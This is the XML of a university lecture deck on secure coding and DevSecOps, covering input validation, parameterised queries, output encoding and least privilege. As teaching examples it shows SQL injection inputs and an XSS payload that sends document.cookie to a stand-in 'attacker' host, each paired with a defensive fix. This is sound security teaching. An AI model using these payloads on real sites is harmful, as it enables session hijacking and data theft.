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323" r:id="rId3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3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071B33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9FC1E8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IE3142 · DEVOPS SECURITY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Software Development Practices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02  ·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1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r>
              <a:rPr lang="en-US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Secure Coding.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2872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secure software development practices.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secure coding techniques and best practices.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secure design principles and common security design patterns.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threat modeling methodologies.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basic risk assessment during software development.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DEVSECOPS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Can't Be an Afterthought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30598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 development introduces security too late.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616982"/>
            <a:ext cx="109087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improves collaboration and software delivery.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integrates security into every stage of the SDLC.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shared responsibility.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should shift left.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enables continuous security.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Software Development Lifecycle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00607" y="3511296"/>
            <a:ext cx="1876605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5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1004971" y="3310128"/>
            <a:ext cx="573131" cy="43891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1004971" y="3310128"/>
            <a:ext cx="57313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8499" y="3602736"/>
            <a:ext cx="1685561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77212" y="3511296"/>
            <a:ext cx="23210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8E5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382466" y="3511296"/>
            <a:ext cx="1437132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0" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2881576" y="3310128"/>
            <a:ext cx="438912" cy="43891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2881576" y="3310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5618" y="3602736"/>
            <a:ext cx="12908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38411" y="3520543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8E5"/>
                </a:solidFill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240466" y="3520543"/>
            <a:ext cx="1853946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5" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4942970" y="3319375"/>
            <a:ext cx="566210" cy="43891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4942970" y="3319375"/>
            <a:ext cx="56621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43428" y="3611983"/>
            <a:ext cx="166521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30689" y="3520543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8E5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→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6458865" y="3520543"/>
            <a:ext cx="1437132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20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6957975" y="3319375"/>
            <a:ext cx="438912" cy="43891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957975" y="3319375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2017" y="3611983"/>
            <a:ext cx="12908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62383" y="3520543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8E5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→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8290559" y="3520543"/>
            <a:ext cx="1629210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25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8789669" y="3319375"/>
            <a:ext cx="497574" cy="43891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8789669" y="3319375"/>
            <a:ext cx="49757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63711" y="3611983"/>
            <a:ext cx="1463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846618" y="3520543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8E5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→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10230667" y="3520543"/>
            <a:ext cx="1758586" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 782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30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10729776" y="3319375"/>
            <a:ext cx="537087" cy="43891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10729776" y="3319375"/>
            <a:ext cx="5370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303818" y="3611983"/>
            <a:ext cx="157955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84350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Question Each Phase Must Answer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60703"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="640080" y="1627632"/>
          <a:ext cx="10527928" cy="4727450"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="208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9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4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the Team Must Ask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Produced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could this feature be abused?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Abuse cases, data classification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are the weak points in this structure?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this code following secure habits?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Reviewed, standards-compliant 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 running system be broken?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/ DAST results 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configuration hardened?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Hardened config, managed secrets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we notice an attack?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Logs, alerts, patch process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472611" y="2697480"/>
            <a:ext cx="987346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 Techniques and Best Practices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72084" y="100137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Secure Coding?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274" y="2182437"/>
            <a:ext cx="5294376" cy="2646417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950874" y="2347029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2147" y="1560645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is the practice of writing software that protects against security vulnerabilities and attacks.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36690" y="2182437"/>
            <a:ext cx="5294376" cy="3483864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dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6565290" y="2347029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290" y="1896148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vulnerabilities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confidential data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software reliability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security risks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application resilience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Software Vulnerabilities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should be aware of common vulnerabilities such as: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2555748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822960" y="2652890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(SQLi)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24428" y="2221992"/>
            <a:ext cx="2555748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3607308" y="2652890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(XSS)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08776" y="2221992"/>
            <a:ext cx="2555748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6391656" y="2652890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Request Forgery (CSRF)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993124" y="2221992"/>
            <a:ext cx="2555748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9176004" y="2652890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Overflow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0080" y="3822192"/>
            <a:ext cx="2555748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822960" y="4187952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Injection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24428" y="3822192"/>
            <a:ext cx="2555748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3607308" y="4187952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Authentication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08776" y="3822192"/>
            <a:ext cx="2555748" cy="1371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6391656" y="4187952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Data Exposure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should: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9953" y="2176272"/>
            <a:ext cx="3921646" cy="404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user inputs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outputs appropriately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parameterized queries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passwords securely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 privilege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securely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hard-coded secrets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999" y="2138600"/>
            <a:ext cx="3951287" cy="1049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user input.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characters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74583"/>
            <a:ext cx="4938787" cy="1444187"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1948"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7F5E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68680" y="4139175"/>
            <a:ext cx="4837176" cy="156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553" y="4314546"/>
            <a:ext cx="4837176" cy="1147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name@email.com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3974583"/>
            <a:ext cx="5294376" cy="1444187"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1948"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBEAEA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4139175"/>
            <a:ext cx="4837176" cy="156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Input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7376" y="4314546"/>
            <a:ext cx="4837176" cy="1147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injection attempt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&lt;script&gt;alert("XSS")&lt;/script&gt;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Parameterized Queries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48353"/>
            <a:ext cx="8740226" cy="1680647"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3318"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="241B1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5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1821505"/>
            <a:ext cx="844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SQL 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95825"/>
            <a:ext cx="84471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username='" + username + "';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860617"/>
            <a:ext cx="8740226" cy="1680647"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3318"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10231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1005840" y="3933769"/>
            <a:ext cx="844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SQL QUERY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87368"/>
            <a:ext cx="84471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username = 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prevents SQL injection · separates code from data · improves application security.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should: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9953" y="1801368"/>
            <a:ext cx="10908792" cy="404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Authentication (MFA)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strong password policies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passwords using secure hashing algorithms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failed login attempts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session management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9953" y="1673352"/>
            <a:ext cx="5294376" cy="2535765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5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868553" y="1901952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553" y="2359152"/>
            <a:ext cx="4837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5264" y="1624755"/>
            <a:ext cx="4837176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 before granting access.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54496" y="1627632"/>
            <a:ext cx="5294376" cy="3406705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6483096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83096" y="2249424"/>
            <a:ext cx="4837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allowed to access?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37376" y="1942535"/>
            <a:ext cx="4837176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permissions for every request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Logging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39953" y="1759963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events that matter for detection and accountability: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679192"/>
            <a:ext cx="2555748" cy="1207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4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841248" y="284378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attempts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4428" y="2679192"/>
            <a:ext cx="2555748" cy="1207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4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3625596" y="284378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authentication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08776" y="2679192"/>
            <a:ext cx="2555748" cy="1207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4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6409944" y="284378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violations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993124" y="2679192"/>
            <a:ext cx="2555748" cy="1207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 45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9194292" y="284378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events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747189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Secure Coding Practices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39953" y="171907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publishes a widely adopted checklist of secure coding practices for development teams. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>OWASP secure coding guidance provides practical recommendations developers can apply while writing software.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9953" y="2256667"/>
            <a:ext cx="10024495" cy="4224528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 194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15024" y="2302387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Areas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096" y="2908254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GB" sz="2000" dirty="0"/>
              <a:t>Input validation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GB" sz="2000" dirty="0"/>
              <a:t>Output encoding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GB" sz="2000" dirty="0"/>
              <a:t>Authentication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GB" sz="2000" dirty="0"/>
              <a:t>Password management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GB" sz="2000" dirty="0"/>
              <a:t>Session management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GB" sz="2000" dirty="0"/>
              <a:t>Access control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GB" sz="2000" dirty="0"/>
              <a:t>Cryptographic practices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GB" sz="2000" dirty="0"/>
              <a:t>Error handling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4CB08FA-91CA-A8A8-8E82-7F16F3069E45}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5488225" y="2768628"/>
            <a:ext cx="4837176" cy="3355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Logging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Data protection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Communication security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File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Database security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Memory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General coding practices </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-GB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HABITS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Secure-Coding Habits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habits form the foundation of writing defensible code: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2555748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6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="804672" y="238658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804672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959368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all input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24428" y="2221992"/>
            <a:ext cx="2555748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0" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3589020" y="238658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358902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85989" y="3118207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parameterised queries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08776" y="2221992"/>
            <a:ext cx="2555748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4" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6373368" y="238658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6373368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73368" y="2909025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output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3124" y="2221992"/>
            <a:ext cx="2555748" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 409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8" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9157716" y="238658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9157716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84564" y="2999232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least privilege in code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01. Validate All Input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originating outside the program form fields, URL parameters, uploaded files, API requests must be checked against expectations before it is used.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7249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answers one question: is this input the shape, type, length and range I expect?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354787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that fails validation is rejected, not corrected and used anyway.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Validate — Only One Is Reliable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4423847"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1741"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBEAEA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Deny-list (Blocklist)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553" y="1373347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known-bad input and reject it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against any variation not on the list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constant maintenance as attacks evolve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and case tricks routinely defeat it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4692" y="4690051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bouncer memorising banned faces — a new face walks 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4496" y="1627632"/>
            <a:ext cx="5294376" cy="4423847"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1741"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7F5E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83096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Allow-list (Allowlist)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7376" y="1471363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exactly what is permitted; reject everything else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and novel input is rejected by default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the definition of valid rarely changes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closed, which is the safe direction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33515" y="4542000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guest list — not on it, not admitted.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Allow-List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 definition of what is acceptable, then reject everything else.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0908792" cy="1382849"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3189"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="241B1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strips what looks dangerous, then uses the input anyway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10543032" cy="1586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= input.replace("'", "").replace("--", "")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15153"/>
            <a:ext cx="10908792" cy="2658799"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3189"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10231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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822896" y="400460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define what is valid, reject anything else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896" y="4376431"/>
            <a:ext cx="10543032" cy="1586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re.fullmatch(r'[A-Za-z0-9_]{3,20}', username):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ValueError('invalid username')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Validate type, length and range — not just characters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= int(request.args['qty'])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(1 &lt;= quantity &lt;= 100):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ValueError('quantity out of range')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Normalise Before You Validate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16" y="1888236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can be written many ways. If validation runs before the input is converted to a single canonical form, an attacker simply chooses a form the check does not recognise.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16" y="2802636"/>
            <a:ext cx="10908792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Canonicalisation means converting input to one standard representation before any check is applied.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Percent-encoding, Unicode variants, mixed case and alternative path separators all defeat naive checks.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decode and normalise first, then validate, then use.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4613148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7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="4704588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  </a:t>
            </a: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guest list checked against the name written on the invitation rather than the name on the passport.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Framework's Controls — Don't Write Your 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frameworks provide validated, maintained implementations of validation, encoding, authentication and session handling.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58775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security code is rarely reviewed as thoroughly as a widely used library and rarely receives security updates.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34107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framework's mechanism and avoid bypassing it most template engines encode output automatically unless explicitly told not to.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2084" y="4736592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900684" y="4828032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  </a:t>
            </a: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 certified lock rather than machining one yourself.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2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02. Use Parameterised Queries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parameterised query sends the command structure and the user's data to the database separately, so the data can never be interpreted as part of the command.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679192"/>
            <a:ext cx="10908792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prepared statements.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is written with placeholders; values are supplied afterwards as data.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definitive fix for SQL injection (OWASP A03).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16" y="4735976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7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868616" y="4827416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  </a:t>
            </a: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a stranger's note in a box marked 'data do not act on', rather than reading it aloud and obeying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2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 vs. Parameterisation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where the user's input goes.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0908792" cy="2007108"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3189"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="241B1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— input is glued into the command string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10543032" cy="1586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"SELECT * FROM users WHERE name = '" + name + "'"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cursor.execute(query)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 = admin'--        -&gt;  comments out the password check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 = ' OR '1'='1     -&gt;  returns every row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47972"/>
            <a:ext cx="10908792" cy="2007108"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3189"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10231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822960" y="4421124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placeholder in the command, value passed separately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695444"/>
            <a:ext cx="10543032" cy="1586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cursor.execute("SELECT * FROM users WHERE name = ?", (name,))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database treats `name` strictly as data.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same malicious input matches nothing.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3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 Encode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converts characters that have special meaning in the destination context into harmless display equivalents, so data is rendered rather than executed.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67919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defence against cross-site scripting, where attacker-supplied text is executed by a victim's browser.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34107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is applied on the way out, at the point of display, and depends on the context: HTML body, HTML attribute, JavaScript or URL.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16" y="4553712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868616" y="4645152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  </a:t>
            </a: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device safe before putting it in a display case it still looks the same, but it cannot function.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3 APPLIED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Input, Encoded and Unencoded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 value never changes, only how it is written to the page.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0908792" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3846"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="241B1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UNENCODED — the browser parses this as a real script tag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105430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&lt;div&gt;&lt;script&gt;fetch('//attacker/'+document.cookie)&lt;/script&gt;&lt;/div&gt;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script executes, session cookie is sent to the attacker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05072"/>
            <a:ext cx="10908792" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3846"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10231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822960" y="4078224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— special characters replaced with entities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52544"/>
            <a:ext cx="105430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&lt;div&gt;&amp;lt;script&amp;gt;fetch('//attacker/'+document.cookie)&amp;lt;/script&amp;gt;&lt;/div&gt;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browser displays the text; nothing executes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85216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input and encoding on output are complementary. Most applications need both.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4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04. Apply Least Privilege in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runs with the minimum permissions required for its function, so a compromise yields limited capability.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58775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 that only reads from a database should not hold permission to drop tables.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327355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principle governs service accounts, cloud roles and container capabilities later in the module.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16" y="4315969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868616" y="4407409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  </a:t>
            </a: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 receives a key to the guest rooms, not to the safe or the manager's office.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4 APPLIED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 Account With Only the Rights It Needs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connects as a restricted account, not as the database administrator.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0908792" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3846"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="241B1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the application connects as an all-powerful account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105430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shop.* TO 'app'@'%';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05072"/>
            <a:ext cx="10908792" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3846"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10231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822960" y="4078224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only the operations this application actually performs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52544"/>
            <a:ext cx="1054303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 ON shop.orders   TO 'app'@'10.0.%';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                ON shop.products TO 'app'@'10.0.%';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2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 DELETE, no DROP, no access to shop.admin_users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85216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SQL injection in this application cannot drop tables or read the administrator table — the blast radius is bounded.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790957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Habit, the Bug It Removes, and the Tool That Checks It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0412"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="640080" y="1627632"/>
          <a:ext cx="11091672" cy="47274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Prevented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By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input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Injection, logic abuse, overflow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 (Week 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Parameterise queries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Semgrep, SonarQube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 output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Cross-site scripting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Semgrep, ZAP (Week 9)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after compromise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review, IAM audit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869F-5A24-7D0B-7C62-B69A97D8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>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC16B51F-9DFD-F1E1-FD0F-9CAF61C1602D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-698642" y="0"/>
            <a:ext cx="13051854" cy="685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F4069BD-E678-3BA8-9765-C9BC3F81B842}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="486853" y="545830"/>
            <a:ext cx="7313295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30FF157-F5F1-B4B6-3854-2D5AAD9FA824}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="469438" y="2858501"/>
            <a:ext cx="9894714" cy="1584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999"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="599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FC0CCF4-01AA-7CA6-A2AF-BA2EB4D3EC81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="486852" y="4440160"/>
            <a:ext cx="9598700" cy="639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99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open discussion.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8FF0FA1-7249-0DF2-7332-61DFE5CCAA7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="620417" y="4068256"/>
            <a:ext cx="639913" cy="41137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2479524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2241</TotalTime>
  <Words>1955</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>374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Wijesooriya</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-07-27T08:33:45Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-03T05:43:26Z</dcterms:modified>
</cp:coreProperties>
</file>